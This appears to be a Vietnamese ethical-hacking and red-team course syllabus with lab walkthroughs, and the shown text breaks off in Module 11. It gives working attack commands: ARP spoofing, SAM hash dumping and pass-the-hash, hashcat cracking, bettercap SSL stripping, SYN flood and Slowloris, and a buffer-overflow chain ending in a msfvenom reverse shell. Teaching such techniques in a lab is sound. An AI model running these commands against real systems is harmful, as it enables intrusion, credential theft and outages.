# GIÁO ÁN BÀI GIẢNG LÝ THUYẾT VÀ HƯỚNG DẪN THỰC HÀNH TÁC CHIẾN RED TEAM
## MASTER LECTURE & LAB SYLLABUS: PEDAGOGY MEETS RED TEAM TRADECRAFT
**Mã hiệu:** `SEC-LECTURE-LAB-MASTER-2026`  
**Phiên bản:** `v3.0 - Exhaustive Edition`  
**Đơn vị biên soạn:** Ban Hội đồng Sư phạm Công nghệ Thông tin & Đội ngũ Chuyên gia Tác chiến An toàn Thông tin  
**Phạm vi:** 20 Chuyên đề Giáo trình Lý thuyết CEH + 20 Bài Báo cáo Thực hành iLab + 8 Chuyên đề Nền tảng Mạng máy tính.

---

## MỤC LỤC TỔNG THỂ CÁC BÀI GIẢNG

- **PHẦN A: BÀI GIẢNG NỀN TẢNG MẠNG VÀ PHÂN TÍCH GÓI TIN (LECTURES 01 - 04)**
  - [Bài giảng N01: Giải phẫu Mô hình 5 tầng TCP/IP & Kỹ thuật Bắt gói tin Wireshark](#bài-giảng-n01-giải-phẫu-mô-hình-5-tầng-tcpip--kỹ-thuật-bắt-gói-tin-wireshark)
  - [Bài giảng N02: Giao thức Tầng Vận chuyển (TCP/UDP) & Dấu hiệu Bắt tay Mạng](#bài-giảng-n02-giao-thức-tầng-vận-chuyển-tcpudp--dấu-hiệu-bắt-tay-mạng)
  - [Bài giảng N03: Giao thức Tầng Mạng (IPv4/IPv6, ICMP, Routing) & Định vị Tuyến đường](#bài-giảng-n03-giao-thức-tầng-mạng-ipv4ipv6-icmp-routing--định-vị-tuyến-đường)
  - [Bài giảng N04: Tầng Liên kết dữ liệu (Ethernet, ARP, VLAN) & Tấn công L2 Man-in-the-Middle](#bài-giảng-n04-tầng-liên-kết-dữ-liệu-ethernet-arp-vlan--tấn-công-l2-man-in-the-middle)

- **PHẦN B: 20 CHUYÊN ĐỀ LÝ THUYẾT & THỰC HÀNH CEH VÀ RED TEAM (MODULES 01 - 20)**
  - [Module 01: Nhập môn Ethical Hacking & Khung phương pháp luận Tấn công](#module-01-nhập-môn-ethical-hacking--khung-phương-pháp-luận-tấn-công)
  - [Module 02: Thu thập Thông tin & Trinh sát Mục tiêu (Footprinting & Reconnaissance)](#module-02-thu-thập-thông-tin--trinh-sát-mục-tiêu-footprinting--reconnaissance)
  - [Module 03: Kỹ thuật Quét mạng & Thám sát Cổng Dịch vụ (Network Scanning)](#module-03-kỹ-thuật-quét-mạng--thám-sát-cổng-dịch-vụ-network-scanning)
  - [Module 04: Định danh & Thu thập Thông tin Dịch vụ Chi tiết (Enumeration)](#module-04-định-danh--thu-thập-thông-tin-dịch-vụ-chi-tiết-enumeration)
  - [Module 05: Đánh giá & Quản trị Lỗ hổng Bảo mật (Vulnerability Analysis)](#module-05-đánh-giá--quản-trị-lỗ-hổng-bảo-mật-vulnerability-analysis)
  - [Module 06: Chiếm quyền Hệ điều hành & Bẻ khóa Mật khẩu (System Hacking)](#module-06-chiếm-quyền-hệ-điều-hành--bẻ-khóa-mật-khẩu-system-hacking)
  - [Chuyên đề Đặc biệt: Khai thác Tràn bộ đệm Bộ nhớ Nhị phân (Buffer Overflow)](#chuyên-đề-đặc-biệt-khai-thác-tràn-bộ-đệm-bộ-nhớ-nhị-phân-buffer-overflow)
  - [Module 07: Phân tích & Vận hành Mã độc Tác chiến (Malware Threats)](#module-07-phân-tích--vận-hành-mã-độc-tác-chiến-malware-threats)
  - [Module 08: Nghe lén & Bắt trộm Dữ liệu trên Mạng (Sniffing)](#module-08-nghe-lén--bắt-trộm-dữ-liệu-trên-mạng-sniffing)
  - [Module 09: Kỹ thuật Xã hội & Đánh lừa Nhận thức (Social Engineering)](#module-09-kỹ-thuật-xã-hội--đánh-lừa-nhận-thức-social-engineering)
  - [Module 10: Tấn công Từ chối Dịch vụ (DoS & DDoS)](#module-10-tấn-công-từ-chối-dịch-vụ-dos--ddos)
  - [Module 11: Chiếm đoạt Phiên làm việc (Session Hijacking)](#module-11-chiếm-đoạt-phiên-làm-việc-session-hijacking)
  - [Module 12: Kỹ thuật Vượt qua Tường lửa, IDS/IPS & Honeypot (Evasion Techniques)](#module-12-kỹ-thuật-vượt-qua-tường-lửa-idsips--honeypot-evasion-techniques)
  - [Module 13: Tấn công & Khai thác Máy chủ Web (Hacking Web Servers)](#module-13-tấn-công--khai-thác-máy-chủ-web-hacking-web-servers)
  - [Module 14: Tấn công Ứng dụng Web theo Chuẩn OWASP Top 10 (Web App Hacking)](#module-14-tấn-công-ứng-dụng-web-theo-chuẩn-owasp-top-10-web-app-hacking)
  - [Module 15: Khai thác Chèn câu lệnh SQL chuyên sâu (SQL Injection)](#module-15-khai-thác-chèn-câu-lệnh-sql-chuyên-sâu-sql-injection)
  - [Module 16: Tấn công Mạng không dây Wi-Fi (Wireless Network Hacking)](#module-16-tấn-công-mạng-không-dây-wi-fi-wireless-network-hacking)
  - [Module 17: Phân tích & Tấn công Ứng dụng Di động Android (Mobile Platform Hacking)](#module-17-phân-tích--tấn-công-ứng-dụng-di-động-android-mobile-platform-hacking)
  - [Module 18: Tấn công Thiết bị IoT và Hệ thống Vận hành Công nghiệp (IoT & OT Hacking)](#module-18-tấn-công-thiết-bị-iot-và-hệ-thống-vận-hành-công-nghiệp-iot--ot-hacking)
  - [Module 19: Khai thác & Leo quyền trên Điện toán Đám mây (Cloud Security Hacking)](#module-19-khai-thác--leo-quyền-trên-điện-toán-đám-mây-cloud-security-hacking)
  - [Module 20: Mật mã học Ứng dụng & Kỹ thuật Phá mã (Cryptography in Red Teaming)](#module-20-mật-mã-học-ứng-dụng--kỹ-thuật-phá-mã-cryptography-in-red-teaming)

---

## PHẦN A: BÀI GIẢNG NỀN TẢNG MẠNG VÀ PHÂN TÍCH GÓI TIN

### Bài giảng N01: Giải phẫu Mô hình 5 tầng TCP/IP & Kỹ thuật Bắt gói tin Wireshark
- **Mục tiêu Sư phạm:** Hiểu rõ tiến trình đóng gói dữ liệu (Encapsulation) từ Tầng Ứng dụng đến Tầng Vật lý; phân biệt rõ PDU (Protocol Data Unit: Data -> Segment -> Packet -> Frame -> Bits).
- **Góc nhìn Red Team:** Mọi công cụ tấn công mạng (Nmap, Metasploit, Scapy) bản chất là các chương trình thao túng các trường nhị phân trong PDU. Red Team giỏi bắt đầu bằng việc đọc lưu lượng thô (Hex dump).
- **Lý thuyết Chuyên sâu:**
  - Mô hình 5 tầng: Application (HTTP, DNS, SSH) -> Transport (TCP, UDP) -> Network (IP, ICMP) -> Data Link (Ethernet) -> Physical (Cáp, Sóng).
  - Khái niệm MTU (Maximum Transmission Unit) = 1500 bytes cho Ethernet chuẩn; MSS (Maximum Segment Size) = MTU - IP Header (20) - TCP Header (20) = 1460 bytes.
- **Thực hành Lab Walkthrough:**
  ```bash
  # 1. Bắt gói tin với tcpdump trên Linux interface eth0
  sudo tcpdump -i eth0 -nn -s0 -v -w /tmp/baseline_capture.pcap
  
  # 2. Phân tích gói tin HTTP GET với tshark
  tshark -r /tmp/baseline_capture.pcap -Y "http.request.method == 'GET'" -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri
  ```
- **Active-Recall QA:**
  - *Hỏi:* PDU ở tầng mạng gọi là gì và chứa thông tin định danh nào?
  - *Đáp:* Packet; chứa địa chỉ IP nguồn (Source IP) và IP đích (Destination IP).

---

### Bài giảng N02: Giao thức Tầng Vận chuyển (TCP/UDP) & Dấu hiệu Bắt tay Mạng
- **Mục tiêu Sư phạm:** Nắm vững cấu trúc TCP Segment; cơ chế bắt tay 3 bước (Three-way Handshake) và chu trình giải phóng kết nối qua FIN/ACK.
- **Góc nhìn Red Team:** Lợi dụng cờ TCP để thực hiện các kiểu quét ẩn mật (SYN Scan, FIN Scan, Xmas Scan). Cơ chế TCP Reset (cờ RST) dùng để ngắt kết nối đối phương.
- **Lý thuyết Chuyên sâu:**
  - Cấu trúc TCP Header (20 - 60 bytes): Source Port (16-bit), Destination Port (16-bit), Sequence Number (32-bit), Acknowledgment Number (32-bit), Data Offset (4-bit), Flags (SYN, ACK, FIN, RST, PSH, URG), Window Size (16-bit), Checksum (16-bit).
  - Chu trình Three-way Handshake:
    1. Client gửi `SYN` (Seq = x).
    2. Server phản hồi `SYN-ACK` (Seq = y, Ack = x + 1).
    3. Client gửi `ACK` (Seq = x + 1, Ack = y + 1).
- **Thực hành Lab Walkthrough:**
  ```bash
  # Bắt tay TCP tùy chỉnh bằng công cụ Scapy (Python)
  python3 -c "
  from scapy.all import IP, TCP, sr1
  syn = IP(dst='192.168.1.100')/TCP(dport=80, flags='S', seq=1000)
  syn_ack = sr1(syn, timeout=2)
  if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 0x12:
      print('Cổng 80 MỞ! Nhận được SYN-ACK!')
      ack = IP(dst='192.168.1.100')/TCP(dport=80, flags='A', seq=1001, ack=syn_ack[TCP].seq + 1)
      sr1(ack, timeout=1)
  "
  ```
- **Active-Recall QA:**
  - *Hỏi:* Khi server đóng cổng nhận được gói tin SYN, server sẽ phản hồi bằng cờ nào?
  - *Đáp:* Gói tin có cờ `RST-ACK`.

---

### Bài giảng N03: Giao thức Tầng Mạng (IPv4/IPv6, ICMP, Routing) & Định vị Tuyến đường
- **Mục tiêu Sư phạm:** Phân tích cấu trúc IPv4 Header; hiểu cơ chế phân mảnh gói tin (Fragmentation) và cơ chế phản hồi lỗi của ICMP.
- **Góc nhìn Red Team:** Kỹ thuật chia nhỏ gói tin để né tránh IDS/Firewall (IP Fragmentation); dùng ICMP Tunneling để luồn lách dữ liệu ra ngoài mạng (Data Exfiltration).
- **Lý thuyết Chuyên sâu:**
  - Các trường IPv4 quan trọng: TTL (Time to Live), Identification, Flags (DF - Don't Fragment, MF - More Fragments), Fragment Offset, Protocol (1 = ICMP, 6 = TCP, 17 = UDP).
  - ICMP Type & Code: Type 8 (Echo Request), Type 0 (Echo Reply), Type 3 (Destination Unreachable), Type 11 (Time Exceeded - cơ sở của lệnh traceroute).
- **Thực hành Lab Walkthrough:**
  ```bash
  # Gửi gói tin phân mảnh qua Nmap để kiểm tra phản ứng của Firewall
  nmap -f -sS -p 80,443,445 192.168.1.100
  
  # Tạo đường hầm ICMP qua công cụ ptunnel
  # Phía Server: sudo ptunnel -x secretpass
  # Phía Client: sudo ptunnel -p <server_ip> -lp 8000 -da 127.0.0.1 -dp 22 -x secretpass
  ```
- **Active-Recall QA:**
  - *Hỏi:* Giá trị TTL giảm đi bao nhiêu qua mỗi Router trung gian?
  - *Đáp:* Giảm 1 đơn vị. Khi TTL = 0, Router gửi lại ICMP Type 11 Code 0 (Time to Live exceeded in transit).

---

### Bài giảng N04: Tầng Liên kết dữ liệu (Ethernet, ARP, VLAN) & Tấn công L2 Man-in-the-Middle
- **Mục tiêu Sư phạm:** Nắm vững cấu trúc Ethernet Frame; cơ chế ánh xạ địa chỉ IP sang MAC qua ARP; cơ chế phân chia mạng ảo VLAN 802.1Q.
- **Góc nhìn Red Team:** Mạng nội bộ tin tưởng mù quáng vào các bản tin ARP không xác thực. Chiếm quyền kiểm soát luồng dữ liệu cục bộ bằng ARP Poisoning là bước đầu tiên để nghe lén mật khẩu và phiên làm việc.
- **Lý thuyết Chuyên sâu:**
  - ARP Request: Broadcast (`FF:FF:FF:FF:FF:FF`), hỏi "Ai có IP x.x.x.x, hãy báo cho IP y.y.y.y".
  - ARP Reply: Unicast, trả lời "IP x.x.x.x có địa chỉ MAC là aa:bb:cc:dd:ee:ff".
  - Gratuitous ARP: Bản tin ARP tự phát, dùng để cập nhật cache các máy khác mà không cần yêu cầu. Kẻ tấn công lợi dụng điều này để đầu độc bảng ARP.
- **Thực hành Lab Walkthrough:**
  ```bash
  # Kích hoạt tính năng IP Forwarding trên máy Linux của kẻ tấn công
  sudo sysctl -w net.ipv4.ip_forward=1
  
  # Đầu độc bảng ARP của Gateway và Máy nạn nhân
  sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
  sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
  
  # Xem bảng ARP trên máy nạn nhân để xác minh MAC Gateway đã bị thay đổi
  arp -a
  ```
- **Active-Recall QA:**
  - *Hỏi:* Biện pháp bảo vệ L2 nào trên Switch của Cisco giúp ngăn chặn ARP Spoofing?
  - *Đáp:* Dynamic ARP Inspection (DAI) kết hợp với DHCP Snooping.

---

## PHẦN B: 20 CHUYÊN ĐỀ LÝ THUYẾT & THỰC HÀNH CEH VÀ RED TEAM

### Module 01: Nhập môn Ethical Hacking & Khung phương pháp luận Tấn công
- **Tài liệu đối chiếu:** `CEH-Notes/Module 01 - Introduction.md` | `02_Ethical_Hacking_Courseware/Module_01_Introduction/`
- **Ánh xạ MITRE ATT&CK:** Pre-ATT&CK & Initial Preparation.
- **Mục tiêu Sư phạm:** Nắm vững tam giác bảo mật CIA (Confidentiality, Integrity, Availability), phân loại hacker (White, Black, Gray Hat), quy trình Pentest 5 giai đoạn: Reconnaissance -> Scanning -> Gaining Access -> Maintaining Access -> Clearing Tracks.
- **Góc nhìn Red Team:** Khác với Pentester chạy theo checklist lỗ hổng, Red Team vận hành theo mô hình Mô phỏng Mối đe dọa Thực tế (Adversary Emulation). Mục tiêu không phải là tìm ra mọi lỗ hổng, mà là đạt được mục tiêu chiến lược (ví dụ: lấy cắp dữ liệu khách hàng, mã hóa DC) mà không kích hoạt chuông báo động của SOC/Blue Team.
- **Thực hành Lab Walkthrough:**
  - Thiết lập môi trường Lab an toàn, cài đặt Kali Linux và cấu hình Virtual Network Host-Only / Internal.
- **Active-Recall QA:**
  - *Hỏi:* Định nghĩa sự khác biệt cốt lõi giữa Vulnerability Assessment và Penetration Testing?
  - *Đáp:* Vulnerability Assessment chỉ quét và định danh danh sách lỗ hổng; Penetration Testing thực sự khai thác lỗ hổng để chứng minh mức độ ảnh hưởng thực tế.

---

### Module 02: Thu thập Thông tin & Trinh sát Mục tiêu (Footprinting & Reconnaissance)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 02 - FootPrinting.md` | `03_Ethical_Hacking_Lab_Reports/ilab 1 footprinting recconessaince_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Reconnaissance: Active Scanning (`T1595`), Gather Victim Org Information (`T1591`), Search Open Websites/Domains (`T1593`).
- **Mục tiêu Sư phạm:** Làm chủ kỹ thuật thu thập thông tin tình báo nguồn mở (OSINT), trinh sát hạ tầng mạng và nhân sự.
- **Góc nhìn Red Team:** "Thời gian trinh sát chiếm 80% thành công của chiến dịch Red Team". Nhận diện đúng kiến trúc phòng thủ bên ngoài (WAF, Mail Gateway) và thông tin cá nhân nhân viên để tạo mồi câu lừa đảo (Spear Phishing).
- **Thực hành Lab Walkthrough (Theo iLab 1):**
  ```bash
  # 1. Tìm kiếm Subdomain bằng sublist3r và amass
  sublist3r -d targetcorp.com -t 10 -o subdomains.txt
  amass enum -passive -d targetcorp.com
  
  # 2. Khảo sát thông tin DNS chi tiết và thử Zone Transfer
  dig axfr @ns1.targetcorp.com targetcorp.com
  
  # 3. Thu thập email và tài khoản mạng xã hội với theHarvester
  theHarvester -d targetcorp.com -b google,linkedin,bing -l 200
  ```
- **Active-Recall QA:**
  - *Hỏi:* Câu lệnh Google Dork nào giúp tìm kiếm các file cấu hình chứa mật khẩu bị lộ trên web?
  - *Đáp:* `filetype:env "DB_PASSWORD"` hoặc `filetype:sql "dump" intext:password`.

---

### Module 03: Kỹ thuật Quét mạng & Thám sát Cổng Dịch vụ (Network Scanning)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 03 - Network Scanning.md` | `03_Ethical_Hacking_Lab_Reports/lab 3 network scanning_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Discovery: Network Service Discovery (`T1046`), System Network Configuration Discovery (`T1016`).
- **Mục tiêu Sư phạm:** Hiểu rõ cơ chế hoạt động của Nmap; phân biệt các kỹ thuật quét TCP/UDP và kỹ thuật thám thính dịch vụ.
- **Góc nhìn Red Team:** Tránh quét ồ ạt (`-T4` hay `-T5`) gây kích hoạt cảnh báo IPS/SIEM. Sử dụng tốc độ quét chậm (`-T2`), ngẫu nhiên hóa thứ tự IP (`--randomize-hosts`), chia nhỏ gói tin và dùng Decoy IP (`-D RND:10`).
- **Thực hành Lab Walkthrough (Theo iLab 3):**
  ```bash
  # 1. Quét SYN Stealth toàn diện các cổng kèm nhận diện dịch vụ và OS
  sudo nmap -sS -sV -O -p- --min-rate 1000 -oA /tmp/target_full 192.168.1.100
  
  # 2. Quét lỗ hổng bằng Nmap Script Engine (NSE)
  nmap --script vuln -p 80,443,445 192.168.1.100
  
  # 3. Sử dụng masscan quét toàn bộ dải mạng với tốc độ cao
  sudo masscan -p80,443,445,3389 192.168.1.0/24 --rate=10000
  ```
- **Active-Recall QA:**
  - *Hỏi:* Tại sao quét UDP (`-sU`) lại diễn ra chậm hơn rất nhiều so với quét TCP?
  - *Đáp:* Vì hệ điều hành giới hạn tần suất gửi bản tin ICMP Type 3 Code 3 (Port Unreachable) để chống tắc nghẽn mạng (ví dụ Linux giới hạn 1 giây gửi tối đa 1 gói tin ICMP phản hồi).

---

### Module 04: Định danh & Thu thập Thông tin Dịch vụ Chi tiết (Enumeration)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 04 - Enumeration.md` | `03_Ethical_Hacking_Lab_Reports/lab 4 Ennumeration_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Discovery: Account Discovery (`T1087`), Permission Groups Discovery (`T1069`), Network Share Discovery (`T1135`).
- **Mục tiêu Sư phạm:** Khảo sát thông tin tài khoản, nhóm quyền, thư mục chia sẻ qua các dịch vụ SMB, SNMP, LDAP, RPC, SMTP.
- **Góc nhìn Red Team:** Lập bản đồ người dùng và các máy chủ chia sẻ quyền (Share Permissions). Tìm kiếm các tệp `web.config`, `id_rsa`, `password.txt` bị chia sẻ công khai không cần mật khẩu (Null Session).
- **Thực hành Lab Walkthrough (Theo iLab 4):**
  ```bash
  # 1. Định danh SMB qua null session và trích xuất danh sách user
  crackmapexec smb 192.168.1.100 -u '' -p '' --shares
  enum4linux -a 192.168.1.100
  
  # 2. Định danh SNMP với snmpwalk
  snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.4.1.77.1.2.25
  
  # 3. Khảo sát danh bạ Active Directory qua LDAP
  ldapsearch -x -H ldap://192.168.1.100 -b "dc=lab,dc=local" "(objectClass=user)" sAMAccountName
  ```
- **Active-Recall QA:**
  - *Hỏi:* Cổng mạng tiêu chuẩn của dịch vụ RPC Endpoint Mapper trên Windows là cổng nào?
  - *Đáp:* Cổng TCP `135`.

---

### Module 05: Đánh giá & Quản trị Lỗ hổng Bảo mật (Vulnerability Analysis)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 05 - Vulnerability Analysis.md` | `03_Ethical_Hacking_Lab_Reports/lab 5 cws_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Reconnaissance: Vulnerability Scanning (`T1595.002`).
- **Mục tiêu Sư phạm:** Cấu hình và chạy các trình quét lỗ hổng tự động (Nessus, OpenVAS, Nikto); đánh giá mức độ nghiêm trọng theo thang CVSS.
- **Góc nhìn Red Team:** Sử dụng kết quả quét lỗ hổng của các công cụ để tìm đường đi ngắn nhất đến Initial Access. Đặc biệt chú ý các lỗ hổng Remote Code Execution (RCE) chưa có bản vá (ví dụ: Log4Shell, MS17-010, ProxyLogon).
- **Thực hành Lab Walkthrough (Theo iLab 5):**
  - Khởi tạo chính sách quét (Scan Policy) trên Nessus.
  - Phân tích báo cáo CVE, đối chiếu với cơ sở dữ liệu Exploit-DB để xác định mã khai thác khả thi (Weaponization).
- **Active-Recall QA:**
  - *Hỏi:* Điểm số CVSS Base Score tối đa là bao nhiêu và phân loại mức Critical từ khoảng nào?
  - *Đáp:* Tối đa là `10.0`; Mức Critical từ `9.0` đến `10.0`.

---

### Module 06: Chiếm quyền Hệ điều hành & Bẻ khóa Mật khẩu (System Hacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 06 - System Hacking.md` | `03_Ethical_Hacking_Lab_Reports/ilab 6 system hacking_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Credential Access: OS Credential Dumping (`T1003`), Brute Force (`T1110`), Privilege Escalation (`TA0004`).
- **Mục tiêu Sư phạm:** Hiểu cơ chế xác thực cục bộ của Windows/Linux; kỹ thuật bẻ khóa mật khẩu offline; leo thang đặc quyền cục bộ (LPE).
- **Góc nhìn Red Team:** Sau khi có shell bước đầu, ưu tiên hàng đầu là trích xuất hash mật khẩu từ LSASS hoặc SAM bằng `Mimikatz` / `secretsdump.py`. Dùng hash vừa có được để đăng nhập vào các máy khác mà không cần bẻ khóa (Pass-the-Hash).
- **Thực hành Lab Walkthrough (Theo iLab 6):**
  ```bash
  # 1. Trích xuất SAM và SYSTEM hive từ Windows
  reg save hklm\sam C:\sam.save
  reg save hklm\system C:\system.save
  
  # 2. Trích xuất NTLM hash trên máy tấn công bằng Impacket
  impacket-secretsdump -sam sam.save -system system.save LOCAL
  
  # 3. Bẻ khóa NTLM hash bằng Hashcat
  hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
  
  # 4. Tấn công Pass-the-Hash bằng Impacket psexec
  impacket-psexec Administrator@192.168.1.100 -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
  ```
- **Active-Recall QA:**
  - *Hỏi:* Kỹ thuật Pass-the-Hash hoạt động dựa trên đặc tính nào của giao thức xác thực NTLM?
  - *Đáp:* Giao thức NTLM sử dụng trực tiếp NTLM Hash của mật khẩu để tính toán bản tin thử thách/trả lời (Challenge-Response), máy chủ không bao giờ yêu cầu mật khẩu dạng bản rõ.

---

### Chuyên đề Đặc biệt: Khai thác Tràn bộ đệm Bộ nhớ Nhị phân (Buffer Overflow)
- **Tài liệu đối chiếu:** `CEH-Notes/Module-6-Buffer-Overflow/Buffer Instructions.md` | `fuzzing.py`
- **Ánh xạ MITRE ATT&CK:** Execution: Exploitation for Client Execution (`T1203`), Memory Corruption.
- **Mục tiêu Sư phạm:** Nắm vững cấu trúc Stack, thanh ghi EIP/ESP, cơ chế ghi đè địa chỉ trả về (Return Address) để chuyển hướng luồng thực thi.
- **Góc nhìn Red Team:** Khai thác lỗ hổng cấp độ bộ nhớ là chìa khóa để thâm nhập các dịch vụ lõi độc quyền hoặc thiết bị mạng kín (Firmware/IoT).
- **Thực hành Lab Walkthrough:**
  1. **Bước 1: Fuzzing để xác định điểm crash**
     ```python
     # fuzzing.py - gửi chuỗi 'A' tăng dần cho đến khi chương trình sập
     import socket
     buffer = "A" * 100
     while len(buffer) < 5000:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('192.168.1.100', 9999))
         s.send(buffer.encode())
         s.close()
         buffer += "A" * 100
     ```
  2. **Bước 2: Tìm Offset bằng Metasploit pattern**
     ```bash
     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
     /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
     ```
  3. **Bước 3: Tìm địa chỉ JMP ESP trong x32dbg/Mona**
     `!mona jmp -r esp -cpb "\x00"`
  4. **Bước 4: Sinh Shellcode và gắn NOP Sled (`\x90` * 16)**
     `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00" -f python`
- **Active-Recall QA:**
  - *Hỏi:* NOP Sled (`\x90`) có tác dụng gì trong chuỗi khai thác Buffer Overflow?
  - *Đáp:* NOP (No Operation) giúp con trỏ lệnh EIP trượt an toàn từ điểm nhảy đến thẳng vị trí bắt đầu của Shellcode mà không lo sai lệch nhỏ về địa chỉ bộ nhớ.

---

### Module 07: Phân tích & Vận hành Mã độc Tác chiến (Malware Threats)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 07 - Malware Threats.md` | `03_Ethical_Hacking_Lab_Reports/ilab 7 Malware threat_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Persistence (`TA0003`), Defense Evasion (`TA0005`), Execution (`TA0002`).
- **Mục tiêu Sư phạm:** Phân loại mã độc; phân tích tĩnh (Static Analysis: PE Header, Strings, Hashes) và phân tích động (Dynamic Analysis: Registry, Process, Network).
- **Góc nhìn Red Team:** Không sử dụng các payload công khai bị Antivirus gắn cờ. Red Team phát triển mã thực thi tùy chỉnh bằng C/C++/C# hoặc Go/Rust, kết hợp kỹ thuật mã hóa Shellcode (XOR/AES) và nạp trực tiếp vào RAM (In-Memory Execution).
- **Thực hành Lab Walkthrough (Theo iLab 7):**
  - Trích xuất Strings của mẫu mã độc bằng `strings` hoặc `FLOSS`.
  - Giám sát hành vi ghi Registry tạo tính bền bỉ (Persistence Key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
- **Active-Recall QA:**
  - *Hỏi:* Sự khác biệt giữa Virus và Worm là gì?
  - *Đáp:* Virus cần file chủ và sự tương tác của người dùng để kích hoạt/lây lan; Worm có khả năng tự động nhân bản và lây lan qua mạng mà không cần can thiệp của con người.

---

### Module 08: Nghe lén & Bắt trộm Dữ liệu trên Mạng (Sniffing)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 08 - Sniffing.md` | `03_Ethical_Hacking_Lab_Reports/ilab 8 sniffing_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Credential Access: Network Sniffing (`T1040`), Adversary-in-the-Middle (`T1557`).
- **Mục tiêu Sư phạm:** Hiểu rõ cơ chế nghe lén mạng; kỹ thuật MAC Flooding làm tràn bảng CAM của Switch; kỹ thuật SSL Stripping.
- **Góc nhìn Red Team:** Triển khai nghe lén bị động hoặc chủ động trong mạng nội bộ để bắt các thông tin xác thực truyền không mã hóa (HTTP Basic Auth, FTP, Telnet, SNMP).
- **Thực hành Lab Walkthrough (Theo iLab 8):**
  ```bash
  # Tấn công SSL Stripping bằng bettercap
  sudo bettercap -iface eth0
  # Trong giao diện bettercap:
  net.probe on
  set arp.spoof.targets 192.168.1.50
  arp.spoof on
  set http.proxy.sslstrip true
  http.proxy on
  ```
- **Active-Recall QA:**
  - *Hỏi:* Bảng CAM (Content Addressable Memory) của Switch bị tràn sẽ dẫn đến hiện tượng gì?
  - *Đáp:* Switch chuyển sang chế độ Fail-Open (hoạt động giống như Hub), gửi bản tin đến tất cả các cổng, cho phép kẻ tấn công nghe lén toàn bộ lưu lượng.

---

### Module 09: Kỹ thuật Xã hội & Đánh lừa Nhận thức (Social Engineering)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 09 - Social Engineering.md`
- **Ánh xạ MITRE ATT&CK:** Initial Access: Phishing (`T1566`).
- **Mục tiêu Sư phạm:** Nắm vững các mô hình tâm lý học thuyết phục (Authority, Urgency, Scarcity, Social Proof); các hình thức tấn công Phishing, Vishing, Smishing.
- **Góc nhìn Red Team:** Spear Phishing là vectơ thâm nhập (Initial Access) phổ biến nhất vào các tập đoàn lớn có tường lửa biên cực kỳ kiên cố. Mồi câu được cá nhân hóa cao độ kết hợp hạ tầng C2 sạch.
- **Thực hành Lab Walkthrough:**
  - Cấu hình chiến dịch mô phỏng Phishing nội bộ bằng công cụ GoPhish.
  - Phân tích chỉ số mở mail (Open Rate), click link (Click Rate) và nhập thông tin (Submitted Data Rate).
- **Active-Recall QA:**
  - *Hỏi:* Cơ chế xác thực email nào kết hợp giữa SPF và DKIM để chống mạo danh địa chỉ người gửi?
  - *Đáp:* DMARC (Domain-based Message Authentication, Reporting, and Conformance).

---

### Module 10: Tấn công Từ chối Dịch vụ (DoS & DDoS)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 10 - DOS and DDOS.md` | `03_Ethical_Hacking_Lab_Reports/ilab 10 dos attack_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Impact: Network Denial of Service (`T1498`), Endpoint Denial of Service (`T1499`).
- **Mục tiêu Sư phạm:** Phân biệt các kiểu tấn công DoS: Tầng mạng (Volume-based: SYN Flood, UDP Flood) vs Tầng ứng dụng (Application-based: Slowloris, HTTP POST Flood).
- **Góc nhìn Red Team:** Trong các chiến dịch Red Team, DoS hiếm khi được dùng để phá hủy, nhưng được dùng có chủ đích để làm mù cảm biến bảo mật hoặc ép hệ thống chuyển sang chế độ dự phòng (Failover) kém an toàn hơn.
- **Thực hành Lab Walkthrough (Theo iLab 10):**
  ```bash
  # Tấn công Slowloris giữ hàng ngàn kết nối HTTP dở dang
  slowloris 192.168.1.100 -s 500
  
  # Mô phỏng SYN Flood với hping3
  sudo hping3 -S -p 80 --flood --rand-source 192.168.1.100
  ```
- **Active-Recall QA:**
  - *Hỏi:* Cơ chế SYN Cookie phòng chống SYN Flood như thế nào mà không cần cấp phát bộ nhớ trước?
  - *Đáp:* Server mã hóa thông tin kết nối vào trường Sequence Number của gói tin SYN-ACK gửi đi; chỉ cấp phát tài nguyên khi nhận được gói tin ACK hợp lệ từ client.

---

### Module 11: Chiếm đoạt Phiên làm việc (Session Hijacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 11 - Session Hijacking.md` | `03_Ethical_Hacking_Lab_Reports/i lab 11 System hijack_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Defense Evasion: Use Alternate Authentication Material (`T1550`), Hijack Execution Flow (`T1574`).
- **Mục tiêu Sư phạm:** Nắm vững cấu trúc Session ID, Cookie flags (HttpOnly, Secure, SameSite); cơ chế cướp phiên ở tầng Network và tầng Application.
- **Góc nhìn Red Team:** Lấy cắp Session Cookie hoặc JWT Token cho phép Red Team truy cập thẳng vào hệ thống mà không cần biết mật khẩu và vượt qua hoàn toàn xác thực đa yếu tố (MFA/2FA Bypass).
- **Thực hành Lab Walkthrough (Theo iLab 11):**
